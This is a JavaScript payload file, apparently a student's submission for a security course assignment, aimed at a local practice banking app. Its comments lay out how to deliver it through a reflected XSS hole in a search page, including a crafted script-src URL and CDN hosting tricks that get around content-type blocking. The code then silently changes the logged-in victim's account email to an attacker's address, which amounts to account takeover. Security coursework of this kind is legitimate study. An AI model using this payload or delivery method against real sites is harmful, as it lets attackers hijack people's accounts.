/**
 * FIT5003 Assignment 2 - Part B.2 (Reflected XSS, external account-takeover payload)
 *
 * This script is hosted on my own public GitHub repo and loaded into the victim's
 * page through the reflected XSS sink in /search via a jsDelivr <script src> tag.
 *
 * What it does:
 *   - runs in the logged-in victim's session on the DevBank origin (same-origin
 *     fetch, so the victim's auth cookie is attached automatically)
 *   - silently changes the victim's account email to one the attacker controls,
 *     which hands the attacker the account-recovery path (an account takeover)
 *
 * Why it works:
 *   - /search reflects the q parameter without escaping, so the <script src> runs
 *   - changing the email needs no existing password, so a single request is enough
 *
 * Hosting note (from the brief):
 *   - use a commit-hash ref (@<commit>), not @<branch>: jsDelivr caches branch refs
 *   - a raw githubusercontent.com URL is served as text/plain with nosniff and will
 *     NOT run; jsDelivr (or GitHub Pages) serves it as JavaScript, so it runs
 *
 * Crafted URL (open it as a logged-in victim):
 *   http://127.0.0.1:5000/search?q=<script src="https://cdn.jsdelivr.net/gh/<user>/<repo>@<commit>/payload.js"></script>
 */

// CONSTANTS
const PROFILE_ENDPOINT = "/profile";
const ATTACKER_EMAIL = "attacker@email.com";

/**
 * Take over the victim's account by changing their email via the profile feature.
 * Runs as the victim (same-origin), so credentials are included automatically.
 */
function takeOverAccount() {
  fetch(PROFILE_ENDPOINT, {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    credentials: "include",   // send the victim's auth cookie with the request
    body: "email=" + encodeURIComponent(ATTACKER_EMAIL),
  });
}

takeOverAccount();
